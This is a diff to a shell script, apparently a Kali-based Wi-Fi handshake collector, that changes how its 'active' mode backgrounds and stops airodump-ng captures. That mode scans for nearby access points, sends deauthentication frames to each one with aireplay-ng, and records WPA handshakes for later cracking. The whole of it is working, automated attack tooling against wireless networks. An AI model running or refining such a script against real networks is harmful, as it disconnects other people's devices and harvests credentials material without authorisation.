@@ -101,7 +101,7 @@ passive() {
 }
 
 active() {
-  trap 'rm /home/kali/hscollector/shakes-* &> /dev/null; getparams' EXIT
+  trap 'kill $!;rm /home/kali/hscollector/shakes-* &> /dev/null; getparams' EXIT
   echo "Collect APs..."
   timeout 10 airodump-ng -w /home/kali/hscollector/shakesCollector $interface </dev/null >/dev/null 
   while IFS=";" read -r id NetType ESSID BSSID Info Channel Cloaked Encryption Decrypted MaxRate MaxSeenRate Beacon LLC Data Crypt Weak Total Carrier Encoding FirstTime LastTime BestQuality BestSignal; do        
@@ -116,8 +116,9 @@ active() {
           printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
           iwconfig $interface channel $Channel
           aireplay-ng -a $BSSID -0 5 $interface &
-          timeout 20 airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &> /dev/null 
-         
+          airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &> /dev/null &
+          sleep 20 
+          kill $!
           checkHandshakes
           rm /home/kali/hscollector/shakes-01.* >/dev/null
           
